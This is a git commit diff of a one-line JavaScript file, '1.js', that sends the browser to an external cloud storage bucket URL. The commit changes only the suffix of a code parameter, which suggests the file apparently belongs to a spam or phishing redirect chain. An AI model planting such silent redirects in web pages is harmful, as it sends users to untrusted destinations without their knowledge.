283ef49d668a1f3a70ae06c3c5cb25b9f17e1056
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-20 16:14:52 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-window.location.href='http://xianzhe8.tos-cn-guangzhou.volces.com/t-y?code=MN8iDf8angY&815'
+window.location.href='http://xianzhe8.tos-cn-guangzhou.volces.com/t-y?code=MN8iDf8angY&H53'
